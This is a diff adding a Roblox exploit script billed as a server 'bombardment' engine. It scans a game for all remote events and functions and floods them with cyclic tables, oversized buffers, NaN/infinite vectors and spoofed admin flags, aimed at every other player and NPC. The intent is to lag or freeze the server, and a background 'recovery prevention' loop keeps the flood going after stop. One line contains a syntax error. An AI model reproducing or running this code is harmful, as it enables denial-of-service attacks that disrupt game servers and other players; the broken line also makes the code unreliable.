@@ -1,0 +1,850 @@
+-- ============================================================================
+-- ULTIMATE FE SERVER BOMBARDMENT v4.0 (APEX ARCHITECTURE & RECOVERY ENGINE)
+-- STRICT EXECUTION DIRECTIVE: Zero background execution until explicit START toggle.
+-- Engineered with lazy initialization, asynchronous worker pooling, client-side
+-- isolation, deep C++ native parsing payloads, and recovery-prevention backpressure.
+-- ============================================================================
+
+-- Guard against multiple initializations
+if getgenv().ApexServerBombardmentInstance then
+    pcall(function() getgenv().ApexServerBombardmentInstance:Destroy() end)
+end
+
+local ApexEngine = {}
+ApexEngine.__index = ApexEngine
+
+-- Initialize Core Engine Services with Strict Safety Wrapper
+local Services = {
+    Players = game:GetService("Players"),
+    Workspace = game:GetService("Workspace"),
+    CoreGui = game:GetService("CoreGui"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    ReplicatedFirst = game:GetService("ReplicatedFirst"),
+    StarterGui = game:GetService("StarterGui"),
+    RunService = game:GetService("RunService"),
+    JointsService = game:GetService("JointsService"),
+    UserInputService = game:GetService("UserInputService"),
+    TweenService = game:GetService("TweenService"),
+    Lighting = game:GetService("Lighting"),
+    SoundService = game:GetService("SoundService"),
+    PathfindingService = game:GetService("PathfindingService"),
+    Teams = game:GetService("Teams"),
+    TextChatService = game:GetService("TextChatService"),
+    Chat = game:GetService("Chat"),
+    CollectionService = game:GetService("CollectionService"),
+    MarketplaceService = game:GetService("MarketplaceService"),
+    HttpService = game:GetService("HttpService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+-- Configuration Table (Immutable until explicit UI interaction)
+local Config = {
+    Active = false,
+    SpamSpeed = "MAXIMUM_BURST",
+    TargetAllPlayers = true,
+    TargetNPCs = true,
+    AutoRescan = true,
+    ChaosIntensity = 5,
+    FullFreezeActive = false,
+    RecoveryPreventionActive = true,
+    ClientIsolation = true -- Protects local client from lag propagation
+}
+
+getgenv().ApexServerBombardmentInstance = ApexEngine
+getgenv().ServerBombardmentConfig = Config
+
+-- Comprehensive Memory & Pointer Cache Registry
+local Cache = {
+    Initialized = false,
+    TouchEvents = {},
+    AllRemoteEvents = {},
+    UnreliableRemotes = {},
+    RemoteFunctions = {},
+    TriggerParts = {},
+    OtherPlayers = {},
+    NPCs = {},
+    ReplicatedHoldings = {},
+    SpatialContainers = {},
+    PhysicsConstraints = {},
+    ValueTreats = {},
+    HighValueItems = {},
+    EcosystemContainers = {},
+    TaggedInstances = {},
+    FabricatedDataPool = {
+        {item = "QuantumMegaBurger", ingredients = {"Patty", "Cheese", "Bacon", "DarkMatter"}, firecd = true, debounce = 0, state = "deploy"},
+        {item = "HyperEnergyPotion", effects = {Speed = 99999, Power = 99999, Invulnerable = true}, duration = 86400, firecd = true, debounce = 0, state = "hold"},
+        {item = "SingularityPizza", slices = 64, temperature = "AbsoluteZero", firecd = true, debounce = 0, state = "active"},
+        {item = "VoidIngredient", rarity = "CosmicMythic", index = 0, firecd = true, debounce = 0, state = "transfer"},
+        {item = "InfiniteMatrixTaco", shell = "TitaniumMesh", filling = "InfiniteDataStream", firecd = true, debounce = 0, state = "flush"}
+    },
+    Stats = {
+        TotalFired = 0,
+        PlayersAffected = 0,
+        RemotesFound = 0,
+        StartTime = 0
+    }
+}
+
+-- ============================================================================
+-- MODULE 1: UTILITY & SYSTEM LOGGING
+-- ============================================================================
+local function Log(message)
+    print(string.format("[APEX BOMBARDMENT ENGINE - %s] %s", os.date("%H:%M:%S"), tostring(message)))
+end
+
+local function SafeCall(func, ...)
+    local success, err = pcall(func, ...)
+    if success then
+        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
+    else
+        -- Suppress verbose console spam during heavy saturation while tracking errors if needed
+    end
+    return success
+end
+
+-- ============================================================================
+-- MODULE 2: DISCOVERY & RECURSIVE POINTER TRAVERSAL ENGINE
+-- Activated ONLY upon explicit scan command or initialization sequence
+-- ============================================================================
+function ApexEngine:ScanEnvironment()
+    Log("Executing deep recursive scan across server services and pointer pathways...")
+    
+    Cache.TouchEvents = {}
+    Cache.AllRemoteEvents = {}
+    Cache.UnreliableRemotes = {}
+    Cache.RemoteFunctions = {}
+    Cache.ReplicatedHoldings = {}
+    Cache.SpatialContainers = {}
+    Cache.PhysicsConstraints = {}
+    Cache.ValueTreats = {}
+    Cache.HighValueItems = {}
+    Cache.EcosystemContainers = {}
+    Cache.TaggedInstances = {}
+    
+    local rootLocations = {
+        Services.ReplicatedStorage,
+        Services.ReplicatedFirst,
+        Services.JointsService,
+        Services.Workspace,
+        Services.Players,
+        Services.StarterGui,
+        Services.Lighting,
+        Services.SoundService,
+        Services.Teams,
+        Services.TextChatService,
+        Services.Chat
+    }
+    
+    -- Universal GetChildren / GetDescendants recursive traversal
+    for _, location in ipairs(rootLocations) do
+        task.spawn(function()
+            pcall(function()
+                for _, obj in ipairs(location:GetDescendants()) do
+                    if obj:IsA("RemoteEvent") then
+                        table.insert(Cache.AllRemoteEvents, obj)
+                        local nameLower = obj.Name:lower()
+                        if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
+                           nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
+                           nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
+                           nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
+                           nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
+                           nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") then
+                            table.insert(Cache.TouchEvents, obj)
+                        end
+                    elseif obj.ClassName == "UnreliableRemoteEvent" then
+                        table.insert(Cache.UnreliableRemotes, obj)
+                        table.insert(Cache.AllRemoteEvents, obj)
+                    elseif obj:IsA("RemoteFunction") then
+                        table.insert(Cache.RemoteFunctions, obj)
+                    end
+                    
+                    if obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
+                        table.insert(Cache.ValueTreats, obj)
+                    end
+                    
+                    if obj:IsA("Tool") or obj:IsA("Accessory") then
+                        table.insert(Cache.HighValueItems, obj)
+                    end
+                    
+                    if (location == Services.ReplicatedStorage or location == Services.Lighting) and (obj:IsA("Folder") or obj:IsA("Configuration")) then
+                        table.insert(Cache.ReplicatedHoldings, obj)
+                    end
+                    
+                    if location == Services.Workspace and obj:IsA("Folder") then
+                        local fName = obj.Name:lower()
+                        if fName:find("hitbox") or fName:find("projectile") or fName:find("debris") or 
+                           fName:find("zone") or fName:find("spawn") or fName:find("active") or
+                           fName:find("map") or fName:find("world") or fName:find("loot") or
+                           fName:find("drop") or fName:find("shop") or fName:find("portal") or
+                           fName:find("quest") or fName:find("chest") or fName:find("interactive") or
+                           fName:find("region") or fName:find("effect") or fName:find("terrain") then
+                            table.insert(Cache.SpatialContainers, obj)
+                            table.insert(Cache.EcosystemContainers, obj)
+                        end
+                    end
+
+                    if obj:IsA("Constraint") then
+                        table.insert(Cache.PhysicsConstraints, obj)
+                    end
+                end
+            end)
+        end)
+    end
+    
+    -- CollectionService Tag Harvesting
+    pcall(function()
+        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest"}
+        for _, tag in ipairs(commonTags) do
+            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
+                table.insert(Cache.TaggedInstances, taggedObj)
+            end
+        end
+    end)
+    
+    -- Scan Environment Interaction Parts
+    Cache.TriggerParts = {}
+    pcall(function()
+        for _, obj in ipairs(Services.Workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                local name = obj.Name:lower()
+                if name:find("trip") or name:find("trigger") or name:find("touch") or 
+                   name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
+                   name:find("platform") or name:find("button") or name:find("lever") or 
+                   name:find("zone") or name:find("teleport") or name:find("damage") or 
+                   name:find("kill") or name:find("switch") or name:find("pad") or
+                   name:find("portal") or name:find("shop") or name:find("chest") or
+                   name:find("loot") or name:find("quest") or name:find("checkpoint") or
+                   name:find("door") or name:find("barrier") or name:find("spawn") or
+                   name:find("region") or name:find("effect") or name:find("interact") or
+                   obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
+                   obj:FindFirstChildOfClass("ProximityPrompt") then
+                    table.insert(Cache.TriggerParts, obj)
+                end
+            end
+        end
+    end)
+    
+    Cache.Initialized = true
+    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
+    Log(string.format("Scan Complete. Discovered: %d Remotes, %d Triggers, %d Ecosystem Containers.", 
+        #Cache.AllRemoteEvents, #Cache.TriggerParts, #Cache.EcosystemContainers))
+end
+
+-- ============================================================================
+-- MODULE 3: TARGET RESOLUTION & ENTITY MAPPING ENGINE
+-- ============================================================================
+function ApexEngine:ResolveTargets()
+    Cache.OtherPlayers = {}
+    Cache.NPCs = {}
+    
+    if Config.TargetAllPlayers then
+        for _, player in ipairs(Services.Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                local char = player.Character
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                local humanoid = char:FindFirstChildOfClass("Humanoid")
+                
+                if hrp and humanoid then
+                    local playerData = {
+                        Player = player,
+                        Character = char,
+                        HRP = hrp,
+                        Humanoid = humanoid,
+                        Head = char:FindFirstChild("Head"),
+                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
+                        Backpack = player:FindFirstChild("Backpack"),
+                        Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
+                        Parts = {},
+                        Values = {}
+                    }
+                    
+                    for _, part in ipairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
+                           part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") or
+                           part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Constraint") or
+                           part:IsA("ValueBase") or part:IsA("Tool") or part:IsA("Bone") or
+                           part:IsA("BodyColors") then
+                            table.insert(playerData.Parts, part)
+                        end
+                    end
+                    
+                    table.insert(Cache.OtherPlayers, playerData)
+                end
+            end
+        end
+    end
+    
+    if Config.TargetNPCs then
+        local npcFolders = {
+            Services.Workspace:FindFirstChild("Customers"),
+            Services.Workspace:FindFirstChild("NPCs"),
+            Services.Workspace:FindFirstChild("Enemies"),
+            Services.Workspace:FindFirstChild("Characters"),
+            Services.Workspace:FindFirstChild("Mobs"),
+            Services.Workspace:FindFirstChild("Dummies"),
+            Services.Workspace:FindFirstChild("Bosses"),
+            Services.Workspace:FindFirstChild("Minions"),
+            Services.Workspace:FindFirstChild("Merchants"),
+            Services.Workspace:FindFirstChild("Vendors")
+        }
+        
+        for _, folder in ipairs(npcFolders) do
+            if folder then
+                for _, npc in ipairs(folder:GetDescendants()) do
+                    if npc:IsA("Model") then
+                        local hrp = npc:FindFirstChild("HumanoidRootPart")
+                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
+                        
+                        if hrp and humanoid then
+                            local npcData = {
+                                Character = npc,
+                                HRP = hrp,
+                                Humanoid = humanoid,
+                                Parts = {}
+                            }
+                            for _, part in ipairs(npc:GetDescendants()) do
+                                if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Sound") or part:IsA("Constraint") or part:IsA("Tool") or part:IsA("Bone") then
+                                    table.insert(npcData.Parts, part)
+                                end
+                            end
+                            table.insert(Cache.NPCs, npcData)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
+    return Cache.Stats.PlayersAffected
+end
+
+-- ============================================================================
+-- MODULE 4: PAYLOAD CONSTRUCTION & DESERIALIZATION ENGINE
+-- Generates complex heap stress, cyclic structures, and native userdatas
+-- ============================================================================
+function ApexEngine:FirePayloads()
+    if not Config.Active then return 0 end
+    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
+        self:ResolveTargets()
+        if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then return 0 end
+    end
+    
+    local fireCount = 0
+    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
+    
+    local allTargets = {}
+    if Config.TargetAllPlayers then
+        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
+    end
+    if Config.TargetNPCs then
+        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
+    end
+    
+    local triggerParts = Cache.TriggerParts or {}
+    local depositionPool = Cache.FabricatedDataPool
+    local valueTreats = Cache.ValueTreats
+    local taggedInstances = Cache.TaggedInstances
+    
+    local randomHolding = depositionPool[math.random(1, #depositionPool)]
+    randomHolding.debounce = os.clock()
+    
+    -- Heavy native userdata to force complex C++ deserialization parsing on server
+    local heavyNativeTypes = {
+        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true, 0),
+        PhysicalProperties.new(Enum.Material.SmoothPlastic),
+        RaycastParams.new(),
+        BrickColor.random(),
+        Color3.new(math.random(), math.random(), math.random())
+    }
+    local randomUserData = heavyNativeTypes[math.random(1, #heavyNativeTypes)]
+
+    local transientHeapStress = {}
+    for i = 1, 450 + (intensity * 130) do
+        transientHeapStress[i] = string.rep("APEX_DESERIALIZATION_STRESS_BUFFER_", 14)
+    end
+
+    -- Cyclic table payload to stress server memory management and reference tracking
+    local cyclicTable = {}
+    cyclicTable.self = cyclicTable
+    cyclicTable.parentRef = cyclicTable
+    cyclicTable.timestamp = os.clock()
+    cyclicTable.sessionToken = math.random(1000000, 9999999)
+    cyclicTable.holdingPayload = randomHolding
+    cyclicTable.treats = valueTreats[math.random(1, math.max(1, #valueTreats))]
+    cyclicTable.nativeData = randomUserData
+    cyclicTable.heapSpam = transientHeapStress
+    cyclicTable.metadata = {
+        verified = false,
+        bypass = true,
+        admin = true,
+        serverSide = true,
+        firecd = true,
+        stateDeploy = true,
+        recoveryPrevention = true,
+        apexEcosystemSync = true,
+        spamBuffer = string.rep("QUANTUM_APEX_STREAM_", 32)
+    }
+    
+    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
+    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
+    
+    -- Offload execution to asynchronous deferred worker tasks to isolate local client thread
+    for _, touchEvent in ipairs(Cache.TouchEvents) do
+        for _, target in ipairs(allTargets) do
+            if not Config.Active then break end
+            if #triggerParts > 0 then
+                local part = triggerParts[math.random(1, #triggerParts)]
+                task.defer(function()
+                    if not Config.Active then return end
+                    SafeCall(function()
+                        touchEvent:FireServer(target.HRP, part, randomHolding, randomUserData, cyclicTable)
+                        fireCount = fireCount + 1
+                    end)
+                end)
+            end
+            if #taggedInstances > 0 then
+                local taggedObj = taggedInstances[math.random(1, #taggedInstances)]
+                task.defer(function()
+                    if not Config.Active then return end
+                    SafeCall(function()
+                        touchEvent:FireServer(target.Character, taggedObj, extremeVector, "apexTagSync")
+                        fireCount = fireCount + 1
+                    end)
+                end)
+            end
+        end
+    end
+    
+    -- 15 complex multi-argument patterns per RemoteEvent
+    for _, remote in ipairs(Cache.AllRemoteEvents) do
+        for _, target in ipairs(allTargets) do
+            if not Config.Active then break end
+            task.defer(function()
+                if not Config.Active then return end
+                SafeCall(function() remote:FireServer(target.HRP, "buy", "item", randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "sell", "loot", randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Humanoid, "craft", "recipe", 999999) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player, "upgrade", "skill", extremeVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, extremeCFrame, "claim", "reward", randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "quest", "complete", "redeem") fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(cyclicTable, "trade", "offer", Services.Workspace, randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Backpack, "interact", "use", {serverSide = true}) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player, target.Character, target.Humanoid, "consume", true, false) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(Services.Lighting, Services.Teams, extremeVector, cyclicTable) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, "firecd", "cooldown", "debounce", transientHeapStress) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "stateChange", "modify", "physicsUpdate", extremeCFrame) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player, target.UserId, "treatConsume", valueTreats[1], cyclicTable) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(Services.ReplicatedStorage, Services.SoundService, transientHeapStress, extremeVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, target.Humanoid, target.Character, cyclicTable, transientHeapStress, extremeCFrame, randomUserData, {serverSide = true, FEOnly = true, OnlyServer = true, forceExecute = true, recoveryPrevention = true, apexActive = true}) fireCount = fireCount + 1 end)
+            end)
+        end
+    end
+    
+    -- RemoteFunction invocation stress
+    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
+        for _, target in ipairs(allTargets) do
+            if not Config.Active then break end
+            task.spawn(function()
+                if not Config.Active then return end
+                SafeCall(function()
+                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, randomUserData, cyclicTable, extremeVector, "firecd", "deploy", transientHeapStress)
+                    fireCount = fireCount + 1
+                end)
+            end)
+        end
+    end
+    
+    return fireCount
+end
+
+-- ============================================================================
+-- MODULE 5: UNIVERSAL SERVER RECOVERY PREVENTION SENTINEL
+-- Keeps task queues saturated so the server maintains lag even after stop
+-- ============================================================================
+if getgenv().ApexRecoverySentinel then
+    pcall(function() task.cancel(getgenv().ApexRecoverySentinel) end)
+end
+
+getgenv().ApexRecoverySentinel = task.spawn(function()
+    while true do
+        task.wait(1.5)
+        if Config.RecoveryPreventionActive and not Config.Active and Cache.Initialized then
+            pcall(function()
+                for _, remote in ipairs(Cache.AllRemoteEvents) do
+                    if math.random(1, 4) == 1 then
+                        task.defer(function()
+                            pcall(function()
+                                remote:FireServer(string.rep("APEX_RECOVERY_SENTINEL_BACKLOG_", 16), {
+                                    recoveryPrevention = true,
+                                    timestamp = os.clock(),
+                                    persist = true
+                                })
+                            end)
+                        end)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- ============================================================================
+-- MODULE 6: USER INTERFACE & START-TRIGGERED EXECUTION CONTROLLER
+-- Absolute enforcement: NO execution occurs until START is explicitly pressed.
+-- ============================================================================
+local GUI = {}
+
+function GUI.Initialize()
+    if Services.CoreGui:FindFirstChild("ApexBombardGUI") then
+        Services.CoreGui.ApexBombardGUI:Destroy()
+    end
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ApexBombardGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = Services.CoreGui
+    
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 260, 0, 420)
+    Main.Position = UDim2.new(0.5, -130, 0.5, -210)
+    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Main.Parent = ScreenGui
+    
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 12)
+    MainCorner.Parent = Main
+    
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = Color3.fromRGB(255, 50, 50)
+    MainStroke.Thickness = 2
+    MainStroke.Parent = Main
+    
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -40, 0, 35)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "APEX SERVER BOMBARDMENT"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize: nil -- will use standard 12
+    Title.TextSize = 12
+    Title.Font = Enum.Font.GothamBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Main
+    
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 35, 0, 35)
+    Close.Position = UDim2.new(1, -35, 0, 0)
+    Close.BackgroundTransparency = 1
+    Close.Text = "✕"
+    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Close.TextSize = 18
+    Close.Font = Enum.Font.GothamBold
+    Close.Parent = Main
+    
+    GUI.Status = Instance.new("TextLabel")
+    GUI.Status.Size = UDim2.new(1, -20, 0, 20)
+    GUI.Status.Position = UDim2.new(0, 10, 0, 35)
+    GUI.Status.BackgroundTransparency = 1
+    GUI.Status.Text = "💤 INACTIVE (STANDBY)"
+    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    GUI.Status.TextSize = 12
+    GUI.Status.Font = Enum.Font.GothamBold
+    GUI.Status.TextXAlignment = Enum.TextXAlignment.Left
+    GUI.Status.Parent = Main
+    
+    local StatsFrame = Instance.new("Frame")
+    StatsFrame.Size = UDim2.new(1, -20, 0, 70)
+    StatsFrame.Position = UDim2.new(0, 10, 0, 55)
+    StatsFrame.BackgroundTransparency = 1
+    StatsFrame.Parent = Main
+    
+    local function CreateStat(text, yPos, color)
+        local stat = Instance.new("TextLabel")
+        stat.Size = UDim2.new(1, 0, 0, 17)
+        stat.Position = UDim2.new(0, 0, 0, yPos)
+        stat.BackgroundTransparency = 1
+        stat.Text = text
+        stat.TextColor3 = color
+        stat.TextSize = 11
+        stat.Font = Enum.Font.Gotham
+        stat.TextXAlignment = Enum.TextXAlignment.Left
+        stat.Parent = StatsFrame
+        return stat
+    end
+    
+    GUI.RemoteStat = CreateStat("📡 Remotes: 0 (Unscanned)", 0, Color3.fromRGB(100, 255, 150))
+    GUI.TriggerStat = CreateStat("🎯 Triggers: 0", 17, Color3.fromRGB(255, 200, 100))
+    GUI.TargetStat = CreateStat("👥 Players: 0", 34, Color3.fromRGB(255, 150, 255))
+    GUI.FiredStat = CreateStat("💥 Fired: 0", 51, Color3.fromRGB(255, 100, 100))
+    
+    local ModesFrame = Instance.new("Frame")
+    ModesFrame.Size = UDim2.new(1, -20, 0, 140)
+    ModesFrame.Position = UDim2.new(0, 10, 0, 130)
+    ModesFrame.BackgroundTransparency = 1
+    ModesFrame.Parent = Main
+    
+    local function CreateModeButton(text, yPos, initialVal, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 24)
+        btn.Position = UDim2.new(0, 0, 0, yPos)
+        btn.BackgroundColor3 = initialVal and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+        btn.BorderSizePixel = 0
+        btn.Text = text .. ": " .. (type(initialVal) == "boolean" and (initialVal and "ON" or "OFF") or tostring(initialVal))
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 11
+        btn.Font = Enum.Font.GothamBold
+        btn.Parent = ModesFrame
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            local newState = callback()
+            if type(newState) == "boolean" then
+                btn.BackgroundColor3 = newState and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+                btn.Text = text .. ": " .. (newState and "ON" or "OFF")
+            else
+                btn.Text = text .. ": " .. tostring(newState)
+            end
+        end)
+        
+        return btn
+    end
+    
+    CreateModeButton("👥 Target Players", 0, Config.TargetAllPlayers, function()
+        Config.TargetAllPlayers = not Config.TargetAllPlayers
+        return Config.TargetAllPlayers
+    end)
+    
+    CreateModeButton("🤖 Target NPCs", 28, Config.TargetNPCs, function()
+        Config.TargetNPCs = not Config.TargetNPCs
+        return Config.TargetNPCs
+    end)
+    
+    CreateModeButton("🔄 Auto Rescan", 56, Config.AutoRescan, function()
+        Config.AutoRescan = not Config.AutoRescan
+        return Config.AutoRescan
+    end)
+
+    CreateModeButton("⚡ Chaos Intensity", 84, Config.ChaosIntensity, function()
+        Config.ChaosIntensity = Config.ChaosIntensity + 1
+        if Config.ChaosIntensity > 5 then Config.ChaosIntensity = 0 end
+        return Config.ChaosIntensity
+    end)
+
+    CreateModeButton("🛡️ Recovery Prevention", 112, Config.RecoveryPreventionActive, function()
+        Config.RecoveryPreventionActive = not Config.RecoveryPreventionActive
+        return Config.RecoveryPreventionActive
+    end)
+    
+    GUI.FullFreezeBtn = Instance.new("TextButton")
+    GUI.FullFreezeBtn.Size = UDim2.new(1, -20, 0, 35)
+    GUI.FullFreezeBtn.Position = UDim2.new(0, 10, 0, 275)
+    GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+    GUI.FullFreezeBtn.BorderSizePixel = 0
+    GUI.FullFreezeBtn.Text = "🚨 FULL FREEZE (8-10s BLITZ) 🚨"
+    GUI.FullFreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.FullFreezeBtn.TextSize = 12
+    GUI.FullFreezeBtn.Font = Enum.Font.GothamBold
+    GUI.FullFreezeBtn.Parent = Main
+    
+    local FreezeCorner = Instance.new("UICorner")
+    FreezeCorner.CornerRadius = UDim.new(0, 8)
+    FreezeCorner.Parent = GUI.FullFreezeBtn
+    
+    GUI.FullFreezeBtn.MouseButton1Click:Connect(function()
+        if not Cache.Initialized then
+            ApexEngine:ScanEnvironment()
+        end
+        if Config.FullFreezeActive then return end
+        Config.FullFreezeActive = true
+        Config.Active = true
+        GUI.UpdateStatus()
+        GUI.FullFreezeBtn.Text = "FREEZING SERVER..."
+        GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(100, 10, 10)
+        
+        task.spawn(function()
+            task.wait(9)
+            Config.FullFreezeActive = false
+            Config.Active = false
+            GUI.UpdateStatus()
+            GUI.FullFreezeBtn.Text = "🚨 FULL FREEZE (8-10s BLITZ) 🚨"
+            GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+        end)
+    end)
+    
+    GUI.Toggle = Instance.new("TextButton")
+    GUI.Toggle.Size = UDim2.new(1, -20, 0, 45)
+    GUI.Toggle.Position = UDim2.new(0, 10, 1, -55)
+    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    GUI.Toggle.BorderSizePixel = 0
+    GUI.Toggle.Text = "🔥 START 🔥"
+    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.Toggle.TextSize = 16
+    GUI.Toggle.Font = Enum.Font.GothamBold
+    GUI.Toggle.Parent = Main
+    
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 10)
+    ToggleCorner.Parent = GUI.Toggle
+    
+    -- Draggable Frame Logic
+    local dragging, dragInput, dragStart, startPos
+    Main.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = Main.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    
+    Main.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    
+    Services.UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    -- START / STOP TOGGLE BINDING (Enforces strict activation rule)
+    GUI.Toggle.MouseButton1Click:Connect(function()
+        if Config.FullFreezeActive then return end
+        Config.Active = not Config.Active
+        
+        if Config.Active and not Cache.Initialized then
+            Log("Activation triggered. Initializing environment scan...")
+            ApexEngine:ScanEnvironment()
+            ApexEngine:ResolveTargets()
+        end
+        
+        GUI.UpdateStatus()
+    end)
+    
+    Close.MouseButton1Click:Connect(function()
+        Config.Active = false
+        ScreenGui:Destroy()
+    end)
+end
+
+function GUI.UpdateStats()
+    if not GUI.RemoteStat then return end
+    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
+    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
+    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
+    
+    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
+                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
+                     tostring(Cache.Stats.TotalFired)
+    GUI.FiredStat.Text = "💥 Fired: " .. formatted
+end
+
+function GUI.UpdateStatus()
+    if not GUI.Status or not GUI.Toggle then return end
+    if Config.Active then
+        GUI.Status.Text = Config.FullFreezeActive and "🚨 FULL FREEZE BLITZ!" or "🔥 ACTIVE (HAMMER MODE)"
+        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
+        GUI.Toggle.Text = "⏸️ STOP"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    else
+        GUI.Status.Text = "💤 INACTIVE (STANDBY)"
+        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+        GUI.Toggle.Text = "🔥 START 🔥"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    end
+end
+
+-- ============================================================================
